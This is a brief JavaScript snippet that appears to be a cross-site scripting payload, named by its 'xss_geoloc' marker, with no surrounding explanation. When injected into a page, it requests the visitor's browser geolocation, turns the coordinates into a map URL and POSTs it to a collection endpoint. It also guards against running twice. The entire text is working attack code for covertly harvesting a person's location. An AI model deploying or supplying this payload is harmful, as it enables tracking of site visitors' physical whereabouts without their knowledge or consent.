if (document.getElementById(&#39;xss_geoloc&#39;) == null){ 
function sendXHR(data)
{
        var xmlhttp= new XMLHttpRequest();
		xmlhttp.open(&#34;POST&#34;,&#34;http://127.0.0.1/secu/geoloc/geoloc.php&#34;,true);
        xmlhttp.setRequestHeader(&#34;Content-type&#34;,&#34;application/x-www-form-urlencoded&#34;);
        xmlhttp.send(&#34;geo=&#34;+data);
}
function showPosition(position) {

var map =&#39;http://maps.googleapis.com/maps/api/staticmap?center=&#39;+ position.coords.latitude+&#39;,&#39;+position.coords.longitude+&#39;&amp;zoom=14&amp;size=600x400&amp;sensor=false&#39;;
sendXHR(encodeURIComponent(map));
   
}
if (navigator.geolocation) 
	{
        navigator.geolocation.getCurrentPosition(showPosition);
    } else 
	{ 
        sendXHR(&#34;Geolocation is not supported by this browser.&#34;);
    }



script = document.createElement(&#39;script&#39;);script.id = &#39;xss_geoloc&#39;; document.body.appendChild(script); }

